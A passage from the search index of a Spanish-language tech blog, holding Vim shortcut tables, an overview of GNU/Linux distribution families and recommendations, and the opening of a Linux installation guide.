    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#apertura-de-archivos",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Apertura de archivos",
    "text": "Apertura de archivos\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n:e nombre_archivo\nPresionar :e seguido del nombre del archivo te permite abrir ese archivo en una nueva pestaña.\n\n\n:badd + nombre_fichero/buffer\nAñadir un buffer sin que se muestre en pantalla.\n\n\n:ls\nLista y enumera todos los buffers/archivos que tenemos abiertos.\n\n\n:bn\nIr al siguiente archivo/buffer que tenemos abierto (Buffer_next).\n\n\n:bp\nIr al archivo/buffer anterior que tenemos abierto (Buffer_previous).\n\n\n:bl\nMostrar en pantalla el último buffer abierto.\n\n\n:bf\nMostrar en pantalla el primer buffer abierto.\n\n\n:b_número_buffer\nCambiar al buffer especificado por su número. Por ejemplo, :b2 para cambiar al buffer número 2.\n\n\n:bd\nCerrar únicamente el archivo/buffer actual que estamos editando.\n\n\n:bd2\nCerrar el buffer número 2.\n\n\n:bd nombre_archivo\nCerrar el buffer del archivo específico. Por ejemplo, :bd nombre_archivo.py cerrará el buffer del archivo “nombre_archivo.py”.\n\n\n:ba\nMostrar todos los buffers en pantalla."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#cierre-de-archivos",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#cierre-de-archivos",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Cierre de archivos",
    "text": "Cierre de archivos\nLlega el momento de decir adiós a Vim y cerrar el editor de texto. Pero, ¿cómo puedes hacerlo de manera rápida y sencilla? Vim también tiene atajos de teclado específicos para salir del programa. Echa un vistazo a la siguiente tabla con los atajos de teclado y sus funciones correspondientes:\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n:q\nPresionar :q te permite salir de Vim si no hay cambios sin guardar en el archivo actual.\n\n\n:q!\nSi realizaste cambios en el archivo y deseas salir de Vim sin guardarlos, puedes utilizar :q!. Esto te permite cerrar Vim sin guardar los cambios.\n\n\n:wq o :x\nSi deseas guardar los cambios y salir de Vim al mismo tiempo, puedes utilizar :wq o :x. Esto guarda los cambios y cierra Vim en un solo paso.\n\n\n:wqa!\nEl comando :wqa! te permite guardar todos los archivos abiertos en Vim y salir, incluso si hay cambios sin guardar.\n\n\n:qa!\nSi deseas cerrar Vim sin guardar los cambios en ninguno de los archivos abiertos, puedes utilizar :qa!. Esto cierra Vim de inmediato y descarta todos los cambios realizados."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#trabajar-con-pestañas",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#trabajar-con-pestañas",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Trabajar con pestañas",
    "text": "Trabajar con pestañas\nLas pestañas en Vim son una forma práctica de organizar y alternar entre múltiples archivos abiertos. Con las siguientes combinaciones de teclas, podrás trabajar con pestañas de manera eficiente:\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n:tabnew nombre_archivo\nAbrir el archivo en una nueva pestaña.\n\n\n:tabc\nCerrar la pestaña actual.\n\n\n:tabo\nCerrar todas las pestañas, excepto la actual.\n\n\ngt o :tabnext\nCambiar a la siguiente pestaña.\n\n\ngT o :tabprev\nCambiar a la pestaña anterior.\n\n\nNúmero gt\nCambiar a la pestaña con el número especificado.\n\n\n:tabs\nListar y enumerar todas las pestañas abiertas.\n\n\n:tabmove N\nMover la pestaña actual a la posición N (1-indexed).\n\n\n:tabedit nombre_fichero\nAbrir un nuevo archivo en una pestaña nueva. Por ejemplo, :tabedit archivo1.txt abrirá archivo1.txt en una nueva pestaña.\n\n\n:tabfind nombre_fichero\nBuscar y abrir un archivo en una pestaña nueva. Por ejemplo, :tabfind archivo2.txt buscará y abrirá archivo2.txt en una nueva pestaña.\n\n\n:tab ball\nAbrir todos los buffers en pestañas separadas.\n\n\n:tab split\nDividir la ventana actual en dos pestañas.\n\n\n:tabfirst\nCambiar a la primera pestaña.\n\n\n:tablast\nCambiar a la última pestaña.\n\n\n:tabm 3\nMover la pestaña actual a una posición específica. Por ejemplo, :tabm 3 moverá la pestaña actual a la posición 3.\n\n\n:tabm 0\nMover la pestaña actual a la última posición.\n\n\n:tabm\nMover la pestaña actual a la siguiente posición.\n\n\n:tabclose! o :q!\nCerrar la pestaña actual sin guardar cambios.\n\n\n:tabclose o :q\nCerrar la pestaña actual con confirmación.\n\n\n:tabonly\nCerrar todas las pestañas excepto la actual.\n\n\nvim -p nombre_archivo_1 nombre_archivo_2\nAbrir múltiples archivos en pestañas separadas. Por ejemplo, vim -p archivo1.sh archivo2.sh abrirá archivo1.sh y archivo2.sh en pestañas separadas."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#división-de-la-ventana-en-paneles-y-cambio-entre-ventanas-y-paneles",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#división-de-la-ventana-en-paneles-y-cambio-entre-ventanas-y-paneles",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "División de la ventana en paneles y cambio entre ventanas y paneles",
    "text": "División de la ventana en paneles y cambio entre ventanas y paneles\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n:sp\nPresionar :sp te permite dividir la ventana horizontalmente, creando un nuevo panel en la parte superior.\n\n\n:vsp\nPresionar :vsp te permite dividir la ventana verticalmente, creando un nuevo panel a la derecha.\n\n\nCtrl+wv\nPresionar Ctrl+w seguido de v dividirá la ventana actual en dos verticales.\n\n\nCtrl+ws\nPresionar Ctrl+w seguido de s dividirá la ventana actual en dos horizontales.\n\n\nCtrl+w+(h/j/k/l) o flecha\nCambiar a la ventana vecina en una dirección específica. Ctrl+w seguido de una de las teclas h, j, k o l cambiará a la ventana vecina en la dirección indicada.\n\n\nCtrl+ww\nPresionar Ctrl+w dos veces cambiará a la siguiente ventana.\n\n\nCtrl+w\nPresionar Ctrl+w cambiará a la ventana anteriormente seleccionada.\n\n\nCtrl+wq\nPresionar Ctrl+w seguido de q cerrará la ventana actual.\n\n\nCtrl+wx\nPresionar Ctrl+w seguido de x intercambiará la posición de las ventanas.\n\n\nCtrl+wr\nPresionar Ctrl+w seguido de r rotará las ventanas hacia la derecha.\n\n\nCtrl+wR\nPresionar Ctrl+w seguido de R rotará las ventanas hacia la izquierda.\n\n\n:split nombre_archivo\nDividir la ventana actual horizontalmente con un archivo. Por ejemplo, :split archivo2.txt dividirá la ventana actual horizontalmente y abrirá archivo2.txt.\n\n\n:resize 40\nCambiar el tamaño de la ventana actual a 40 líneas.\n\n\n:vertical resize 80\nCambiar el ancho de la ventana actual a 80 columnas.\n\n\n:vertical resize -5\nReducir el ancho de la ventana actual en 5 columnas.\n\n\n:vertical resize +5\nAumentar el ancho de la ventana actual en 5 columnas.\n\n\nCtrl+w &gt; y Ctrl+w &lt;\nPresionar Ctrl+w seguido de &gt; o &lt; ajustará el tamaño de la ventana hacia la derecha o izquierda, respectivamente.\n\n\nCtrl+w + y Ctrl+w -\nPresionar Ctrl+w seguido de + o - aumentará o reducirá el tamaño de la ventana verticalmente, respectivamente.\n\n\nCtrl+w =\nPresionar Ctrl+w seguido de = igualará el tamaño de todas las ventanas.\n\n\nvim -o archivo1 archivo2 archivo3\nAbrir múltiples archivos en ventanas separadas. vim -o archivo1.txt archivo2.txt archivo3.txt abrirá archivo1.txt, archivo2.txt y archivo3.txt en ventanas separadas."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#personalización-del-archivo-.vimrc",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#personalización-del-archivo-.vimrc",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Personalización del archivo .vimrc",
    "text": "Personalización del archivo .vimrc\nEl archivo .vimrc es donde puedes definir tus preferencias de Vim. Puedes personalizar aspectos como el color del fondo, el tamaño de la fuente, las opciones de resaltado de sintaxis y mucho más. Edita este archivo para que Vim se ajuste a tu estilo y preferencias personales. ¡Haz de Vim tu editor único!"
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#uso-de-plugins-y-extensiones",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#uso-de-plugins-y-extensiones",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Uso de plugins y extensiones",
    "text": "Uso de plugins y extensiones\nVim cuenta con una amplia gama de plugins y extensiones que te permiten ampliar sus funcionalidades. Puedes agregar complementos para la administración de proyectos, resaltado de sintaxis avanzado, autocompletado y mucho más. Explora la comunidad de plugins de Vim y encuentra las herramientas que se adapten mejor a tus necesidades. ¡Potencia tus capacidades editoriales!"
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#configuración-de-atajos-de-teclado-personalizados",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#configuración-de-atajos-de-teclado-personalizados",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Configuración de atajos de teclado personalizados",
    "text": "Configuración de atajos de teclado personalizados\nVim te permite personalizar los atajos de teclado según tus preferencias. Puedes asignar tus propias combinaciones de teclas para realizar acciones específicas, como guardar un archivo, buscar y reemplazar, o incluso para ejecutar comandos personalizados. Configura tus atajos de teclado para trabajar de manera más eficiente y adaptada a tu flujo de trabajo. ¡Crea tu propio mapa de atajos!"
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#uso-de-marcadores",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#uso-de-marcadores",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Uso de marcadores",
    "text": "Uso de marcadores\nLos marcadores son una herramienta útil para marcar y acceder rápidamente a ubicaciones específicas en un archivo. Puedes colocar marcadores en líneas específicas y luego saltar entre ellos con facilidad. Usa ma para establecer un marcador en la posición actual y m[a-z] para asignar un marcador a una letra específica. Luego, utiliza 'a para saltar al marcador. ¡No pierdas nunca la pista de tus puntos clave!"
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#autocompletado-y-omnicomplete",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#autocompletado-y-omnicomplete",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Autocompletado y omnicomplete",
    "text": "Autocompletado y omnicomplete\nVim ofrece características avanzadas de autocompletado que te ayudarán a escribir código más rápido y eficientemente. Utiliza &lt;Ctrl + n&gt; y &lt;Ctrl + p&gt; para navegar por las opciones de autocompletado mientras escribes. Además, con la función de omnicomplete, puedes obtener sugerencias contextuales y completar palabras automáticamente presionando &lt;Ctrl + x&gt; seguido de &lt;Ctrl + o&gt;. ¡Escribe código de forma más rápida y precisa!"
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#trabajo-con-macros",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#trabajo-con-macros",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Trabajo con macros",
    "text": "Trabajo con macros\nLas macros te permiten grabar y reproducir una serie de comandos en Vim. Esto es útil cuando tienes que realizar acciones repetitivas en varios lugares del archivo. Graba una macro usando q[a-z] seguido de los comandos que deseas grabar y luego reproduce la macro usando @[a-z]. ¡Automatiza tareas tediosas y ahorra tiempo!"
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#uso-de-scripts-y-automatización",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#uso-de-scripts-y-automatización",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Uso de scripts y automatización",
    "text": "Uso de scripts y automatización\nVim ofrece la posibilidad de utilizar scripts para personalizar y automatizar tareas. Puedes crear tus propios scripts en lenguajes como VimScript o Python y ejecutarlos dentro de Vim. Esto te permite realizar acciones complejas y personalizadas de manera más eficiente. Explora la documentación de Vim para aprender cómo escribir y ejecutar scripts. ¡Haz que Vim se adapte aún más a tus necesidades!"
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#referencias-y-documentación-oficial-de-vim",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#referencias-y-documentación-oficial-de-vim",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Referencias y documentación oficial de Vim",
    "text": "Referencias y documentación oficial de Vim\nLa documentación oficial de Vim es una fuente invaluable de información. Puedes acceder a ella a través del comando :help dentro de Vim. Este recurso abarca todos los aspectos del editor y proporciona explicaciones detalladas de los comandos, configuraciones y características. Consulta la documentación oficial para tener una referencia confiable y completa sobre Vim."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#comunidades-y-foros-de-usuarios-de-vim",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#comunidades-y-foros-de-usuarios-de-vim",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Comunidades y foros de usuarios de Vim",
    "text": "Comunidades y foros de usuarios de Vim\nExisten diversas comunidades en línea donde puedes encontrar apoyo y compartir conocimientos con otros usuarios de Vim. Reddit cuenta con un subreddit dedicado a Vim (/r/vim), donde puedes hacer preguntas, compartir consejos y estar al tanto de las últimas novedades relacionadas con Vim. Además, hay foros como VimGolf y Vim Tips Wiki que ofrecen desafíos y consejos prácticos para mejorar tus habilidades en Vim. Únete a estas comunidades para aprender de otros entusiastas de Vim."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#libros-y-tutoriales-recomendados-sobre-vim",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#libros-y-tutoriales-recomendados-sobre-vim",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Libros y tutoriales recomendados sobre Vim",
    "text": "Libros y tutoriales recomendados sobre Vim\nSi prefieres un enfoque más estructurado y detallado, hay varios libros y tutoriales disponibles para aprender Vim. Algunos títulos populares incluyen “Aprendiendo Vim en 21 días” de Tony Steidler-Dennison, “Vim Book” de Steve Oualline y “Practical Vim” de Drew Neil. Estos recursos te guiarán paso a paso a través de los conceptos y técnicas fundamentales de Vim. Además, hay numerosos tutoriales en línea, videos y cursos que puedes encontrar en plataformas educativas como Udemy y YouTube.\nExplora estos recursos adicionales para continuar mejorando tus habilidades en Vim y descubrir nuevas técnicas y trucos. Recuerda que la práctica regular y la experimentación son clave para dominar Vim."
  },
  {
    "objectID": "operating-system/2023-06-18-02-distribuciones-linux/index.html",
    "href": "operating-system/2023-06-18-02-distribuciones-linux/index.html",
    "title": "Distribuciones de GNU/Linux",
    "section": "",
    "text": "¡Bienvenido al fascinante mundo de las distribuciones de Linux! Si eres un entusiasta de la tecnología, un aficionado a la informática o simplemente estás buscando una alternativa al sistema operativo convencional, estás en el lugar adecuado. En este blog, exploraremos las diversas distribuciones de Linux, sus características únicas y las ventajas que ofrecen. Prepárate para descubrir un universo de posibilidades, personalización y libertad que te sorprenderá. ¡Acompáñanos en este apasionante viaje por las distribuciones de Linux y despierta tu curiosidad tecnológica!\n\n¿Qué es una distribución de Linux?\nEn pocas palabras, una distribución de Linux es una versión completa y lista para usar del sistema operativo Linux. Piénsalo como un paquete que incluye el kernel de Linux (el núcleo del sistema operativo) junto con un conjunto de software adicional, como aplicaciones, controladores y herramientas.\nLa belleza de las distribuciones de Linux radica en su diversidad. Hay una amplia gama de distribuciones disponibles, cada una con su propio enfoque y características únicas. Algunas distribuciones están diseñadas para ser fáciles de usar y amigables para los principiantes, mientras que otras están orientadas a usuarios más avanzados o tienen un enfoque específico, como la seguridad o la privacidad.\nCada distribución tiene su propia identidad, con diferentes interfaces de usuario, opciones de personalización y filosofías subyacentes. Algunas de las distribuciones más populares incluyen Ubuntu, Linux Mint, Debian, Fedora y Arch Linux, por nombrar solo algunas.\nLa clave de una distribución de Linux es que todo su software es de código abierto, lo que significa que el código fuente está disponible para que cualquier persona lo vea, lo modifique y lo comparta. Esto promueve la colaboración y la innovación, y también garantiza que los usuarios tengan libertad para usar, modificar y distribuir el software de acuerdo con sus necesidades.\n\n\nFamilias de distribuciones de Linux.\nImagina que las distribuciones son como grandes familias, donde cada una comparte ciertas características y rasgos comunes. Estas familias se agrupan según su origen, sus objetivos y las filosofías que las guían.\nExisten varias familias principales de distribuciones de Linux, y cada una tiene su propia personalidad. Permíteme presentarte algunas de las familias más destacadas:\n\nDebian: Esta es una de las familias más antiguas y respetadas en el mundo de Linux. Debian se enfoca en la estabilidad y la filosofía del software libre. Sus distribuciones derivadas, como Ubuntu y Linux Mint, son conocidas por su facilidad de uso y su amplia comunidad de usuarios.\nRed Hat: Esta familia se centra en el ámbito empresarial y en ofrecer soluciones robustas y confiables. Distribuciones como Red Hat Enterprise Linux (RHEL) y CentOS son populares en entornos empresariales y servidores.\nopenSUSE: Con un enfoque en la facilidad de uso y la estabilidad, las distribuciones de la familia openSUSE son conocidas por su amigable entorno de escritorio y herramientas de administración poderosas.\nArch Linux: Si eres un entusiasta de la personalización y disfrutas del desafío, la familia Arch Linux es para ti. Estas distribuciones ofrecen un enfoque “hágalo usted mismo”, lo que significa que tendrás que construir tu sistema desde cero, pero con la libertad de elegir cada componente.\n\nEstas son solo algunas de las familias de distribuciones de Linux más reconocidas, pero hay muchas más por explorar. Cada una tiene su propio conjunto de distribuciones derivadas, cada una con sus características y enfoques únicos.\nMás adelante, nos adentraremos en cada una de estas familias y descubriremos qué las hace especiales.\n\n\nLos ciclos de lanzamiento\nCada distribución tiene su propio ritmo de desarrollo y lanzamiento de nuevas versiones. Estos ciclos de lanzamiento determinan la frecuencia y la regularidad con la que se publican actualizaciones y mejoras en el sistema operativo.\nAlgunas distribuciones, como Ubuntu, siguen un ciclo de lanzamiento regular, con versiones programadas cada seis meses. Esto significa que puedes esperar nuevas características y actualizaciones con regularidad, lo que te permite mantener tu sistema al día de forma constante.\nPor otro lado, existen distribuciones que optan por un ciclo de lanzamiento más conservador. Debian, por ejemplo, sigue un ciclo de lanzamiento estable y prefiere la estabilidad sobre las últimas novedades. Esto implica que las actualizaciones se lanzan con menos frecuencia, pero se centran en proporcionar un sistema confiable y sin problemas.\nAdemás de los ciclos de lanzamiento regulares, algunas distribuciones ofrecen versiones LTS (Long Term Support) que brindan soporte extendido a largo plazo. Estas versiones suelen tener un ciclo de lanzamiento más largo, lo que garantiza actualizaciones de seguridad y soporte técnico durante un período más prolongado, ideal para entornos empresariales y usuarios que buscan estabilidad a largo plazo.\n\n\nSoporte y las actualizaciones\nUna de las ventajas más destacadas de Linux es su sólido soporte y la constante mejora a través de actualizaciones. Veamos qué significa esto en la práctica.\nCuando hablamos de soporte, nos referimos a la atención técnica que recibes de la comunidad o el equipo de desarrollo de una distribución. La mayoría de las distribuciones de Linux cuentan con una activa comunidad en línea donde puedes encontrar ayuda, compartir conocimientos y resolver problemas.\nAdemás, muchas distribuciones también ofrecen soporte oficial a través de foros, chats o incluso servicios de asistencia técnica. Esto es especialmente relevante si necesitas resolver problemas más complejos o si deseas un nivel de soporte profesional para entornos empresariales.\nEn cuanto a las actualizaciones, Linux destaca por su enfoque en la seguridad y la mejora continua. Las actualizaciones se lanzan regularmente para corregir errores, solucionar vulnerabilidades y añadir nuevas funcionalidades.\nEs importante destacar que las actualizaciones en Linux no solo se limitan al sistema operativo en sí, sino también a las aplicaciones y los paquetes de software que utilizas. Esto significa que puedes mantener todo tu sistema actualizado y seguro de manera sencilla.\nAdemás, muchas distribuciones ofrecen herramientas específicas para gestionar las actualizaciones, lo que facilita aún más el proceso. Puedes programar actualizaciones automáticas o realizarlas manualmente según tus preferencias.\n\n\nLas principales distribuciones de Linux\n\nUbuntu: Comenzamos con una de las distribuciones más populares y amigables para principiantes. Ubuntu destaca por su enfoque en la facilidad de uso y su amplia comunidad de usuarios dispuestos a brindar ayuda. Además, cuenta con una gran cantidad de software disponible y una interfaz intuitiva.\nLinux Mint: Si buscas una experiencia similar a la de Windows, Linux Mint es una excelente opción. Esta distribución se basa en Ubuntu y ofrece un entorno de escritorio familiar y fácil de navegar. También incluye una selección de software preinstalado y una gran estabilidad.\nDebian: Conocida por su estabilidad y robustez, Debian es una distribución sólida y confiable. Es utilizada tanto por usuarios domésticos como por profesionales de la industria. Además, cuenta con un amplio repositorio de software y una comunidad activa que se enfoca en la calidad y la seguridad.\nFedora: Si eres un usuario más avanzado y te gusta estar a la vanguardia de las últimas tecnologías, Fedora es para ti. Esta distribución se destaca por su enfoque en la innovación y las características de vanguardia. También es respaldada por Red Hat, lo que garantiza un alto nivel de calidad y soporte.\nArch Linux: Si buscas un nivel de personalización y control extremo, Arch Linux es la elección ideal. Esta distribución te permite construir tu sistema operativo desde cero, seleccionando y configurando cada componente según tus preferencias. Requiere un poco más de conocimiento técnico, pero ofrece una experiencia única y adaptada a tus necesidades.\n\n\n\nLas mejores distribuciones de Linux para principiantes.\nSi estás dando tus primeros pasos en el mundo de Linux, estas opciones te brindarán una experiencia amigable y sin complicaciones.\n\nUbuntu: Como ya mencionamos anteriormente, Ubuntu es una opción excelente para principiantes. Su interfaz intuitiva, amplia comunidad de usuarios y abundante documentación lo convierten en un punto de partida ideal. Además, cuenta con una versión de LTS (Soporte a Largo Plazo) que ofrece estabilidad y actualizaciones a largo plazo.\nLinux Mint: Si buscas una experiencia similar a la de Windows, Linux Mint es una elección popular. Su entorno de escritorio Cinnamon es familiar y fácil de navegar, lo que facilita la transición desde otros sistemas operativos. Además, incluye una selección de software preinstalado para comenzar rápidamente.\nZorin OS: Diseñada específicamente para usuarios que migran desde Windows, Zorin OS ofrece un entorno de escritorio similar y una experiencia familiar. Con su enfoque en la facilidad de uso y la accesibilidad, es una excelente opción para aquellos que buscan una transición suave a Linux.\nelementary OS: Si valoras el diseño elegante y minimalista, elementary OS es una opción a considerar. Su apariencia limpia y cuidada se asemeja a macOS, lo que atrae a muchos usuarios. También cuenta con una selección de aplicaciones propias y se enfoca en brindar una experiencia fluida y cohesiva.\n\n\n\nLas distribuciones de Linux más fiables y robustas\nSi estás buscando estabilidad y seguridad para tus proyectos, estas opciones son ideales.\n\nDebian: Conocida por su enfoque en la estabilidad, Debian es una distribución sólida y confiable. Su riguroso proceso de pruebas garantiza un sistema robusto y libre de errores. Es ampliamente utilizada en servidores y entornos profesionales que requieren un rendimiento constante.\nopenSUSE Leap: Si buscas una distribución que combine estabilidad y actualizaciones constantes, openSUSE Leap es una excelente elección. Basada en el proyecto SUSE Linux Enterprise, ofrece una plataforma sólida y segura para tus necesidades tanto personales como empresariales.\n\n\n\nLas distribuciones para Usuarios Avanzados\nSi estás buscando una experiencia de Linux más personalizada y orientada a usuarios avanzados, estás en el lugar correcto. En esta ocasión, te presentaré algunas distribuciones ideales para aquellos que desean un mayor control y flexibilidad en su sistema operativo.\n\nFedora: Si eres un entusiasta de la tecnología y te encanta estar a la vanguardia, Fedora es una excelente elección. Con su enfoque en la innovación y las últimas características, esta distribución te permitirá experimentar con las últimas herramientas y tecnologías de software.\nArch Linux: Para aquellos que buscan un control total sobre su sistema, Arch Linux es la opción perfecta. Con un enfoque minimalista y una instalación desde cero, te permite construir un sistema adaptado a tus necesidades específicas. Prepárate para sumergirte en el mundo de la personalización y la configuración avanzada.\n\n\n\nLas distribuciones para Servidores\nSi estás interesado en utilizar Linux como plataforma de servidor. En este apartado, te presentaré algunas distribuciones especialmente diseñadas para satisfacer las necesidades de los entornos de servidor.\n\nUbuntu Server: Una opción popular y ampliamente utilizada en el ámbito de los servidores es Ubuntu Server. Con su enfoque en la estabilidad, seguridad y facilidad de uso, esta distribución es perfecta tanto para principiantes como para usuarios más experimentados. Además, cuenta con una gran comunidad de soporte y una amplia variedad de aplicaciones disponibles.\n\n\n\nLas distribuciones comerciales\nEstán especialmente diseñadas para entornos empresariales. Si buscas una solución confiable y respaldada por un soporte profesional, estas distribuciones son ideales para ti. ¡Veamos algunas de las principales opciones disponibles!\n\nRed Hat Enterprise Linux (RHEL): Considerada una de las distribuciones más sólidas y estables del mercado, RHEL ofrece un alto nivel de rendimiento, seguridad y escalabilidad. Esta distribución cuenta con un amplio respaldo de Red Hat, una reconocida empresa en el ámbito de Linux, lo que garantiza un soporte técnico y actualizaciones de calidad.\nSUSE Linux Enterprise: Otra opción destacada en el ámbito empresarial es SUSE Linux Enterprise. Con su enfoque en la estabilidad y la interoperabilidad, esta distribución ofrece una amplia gama de herramientas y características diseñadas específicamente para satisfacer las necesidades de las empresas. Además, cuenta con un sólido respaldo de SUSE, una empresa líder en soluciones de código abierto.\n\n\n\nOtras distribuciones\nQuiero presentarte algunas distribuciones de Linux que no pertenecen a categorías específicas, pero que son igualmente interesantes y valiosas en su propio derecho. Estas distribuciones se destacan por ofrecer características únicas y enfoques diferentes. ¡Veamos algunas de ellas!\n\nKali Linux: Si estás interesado en la seguridad informática y las pruebas de penetración, Kali Linux es la distribución perfecta para ti. Viene preinstalada con una amplia gama de herramientas de seguridad y ofrece un entorno propicio para realizar pruebas éticas y evaluar la seguridad de los sistemas.\nQubes OS: Si la privacidad y el aislamiento son tus principales preocupaciones, Qubes OS es una opción fascinante. Esta distribución se centra en la seguridad y el aislamiento de los diferentes entornos de trabajo. Te permite ejecutar diferentes aplicaciones en entornos separados y asegura que tu actividad en línea esté protegida y aislada.\n\nEn nuestro próximo artículo, nos adentraremos en otros aspectos emocionantes de Linux. ¡No te lo pierdas! ¡Continúa explorando con nosotros y descubriendo todo lo que Linux tiene para ofrecerte! ¡Hasta pronto!\n\n\nPublicaciones Similares\nSi te interesó este artículo, te recomendamos que explores otros blogs y recursos relacionados que pueden ampliar tus conocimientos. Aquí te dejo algunas sugerencias:\n\n Comandos De Informacion Windows\n Adb\n Limpieza Y Optimizacion De Pc\n Usando Apk En Windown 11\n Gestionar Versiones De Jdk En Kubuntu\n Instalar Tor Browser\n Crear Enlaces Duros O Hard Link En Linux\n Comandos Vim\n Guia De Git Y Github\n 00 Primeros Pasos En Linux\n 01 Introduccion Linux\n 02 Distribuciones Linux\n 03 Instalacion Linux\n 04 Administracion Particiones Volumenes\n Atajos De Teclado Y Comandos Para Usar Vim\n Instalando Specitify\n\nEsperamos que encuentres estas publicaciones igualmente interesantes y útiles. ¡Disfruta de la lectura!\n\n\n\n\nReutilizaciónCC BY-SA 4.0Cómo citarPor favor, cita este trabajo como:\nAchalma, Edison. 2023. “Distribuciones de GNU/Linux,” June.\nhttps://achalmaedison.netlify.app/operating-system/2023-06-18-02-distribuciones-linux/."
  },
  {
    "objectID": "operating-system/2023-06-19-03-instalacion-linux/index.html",
    "href": "operating-system/2023-06-19-03-instalacion-linux/index.html",
    "title": "Descarga, Instalación y Más de GNU/Linux",
    "section": "",
    "text": "¡Hola, lector!\nBienvenido a esta emocionante serie de introducción a Linux. Si estás dando tus primeros pasos en este fascinante mundo, estás en el lugar adecuado. Aquí, desgranaremos algunos aspectos fundamentales que debes conocer, desde las distribuciones y entornos gráficos hasta las aplicaciones y la administración del sistema.\nEn esta parte práctica, nos enfocaremos en los pasos necesarios para descargar una distribución GNU/Linux y comenzar a probarla en tus propios equipos. Te guiaré a través de diferentes etapas, desde la selección del hardware hasta la descarga de la imagen ISO y la preparación de los medios de instalación. Además, exploraremos diversas opciones para probar o instalar Linux.\nSi estás listo para embarcarte en esta emocionante aventura, acompáñame en este recorrido. ¡Juntos descubriremos el poder y la versatilidad de GNU/Linux!"
  },
  {
    "objectID": "operating-system/2023-06-19-03-instalacion-linux/index.html#opciones-para-probar-o-instalar-linux",
    "href": "operating-system/2023-06-19-03-instalacion-linux/index.html#opciones-para-probar-o-instalar-linux",
    "title": "Descarga, Instalación y Más de GNU/Linux",
    "section": "Opciones para Probar o Instalar Linux",
    "text": "Opciones para Probar o Instalar Linux\n¡Es hora de decidir cómo quieres probar o instalar Linux en tu equipo, intrépido lector! Afortunadamente, tienes varias opciones disponibles que se adaptan a tus necesidades y preferencias.\nLa primera opción es probar Linux sin realizar una instalación completa en tu equipo. Esto se conoce como “modo Live”. Es ideal si quieres explorar Linux sin hacer cambios permanentes en tu sistema operativo actual. Simplemente inserta el dispositivo USB de arranque que creaste en el paso anterior, reinicia tu equipo y selecciona la opción “Probar Linux” en el menú de arranque. Esto cargará Linux desde el dispositivo USB y podrás experimentar su funcionalidad y características. ¡Es como hacer una prueba de manejo antes de decidirte!\nSi te sientes cómodo y deseas instalar Linux de forma permanente en tu equipo, también tienes esa opción. Reinicia tu equipo con el dispositivo USB de arranque insertado y elige la opción “Instalar Linux” en el menú de arranque. Esto iniciará el asistente de instalación, donde podrás seguir los pasos sencillos para instalar Linux en tu disco duro. Recuerda que durante este proceso, se te pedirá que tomes decisiones, como la 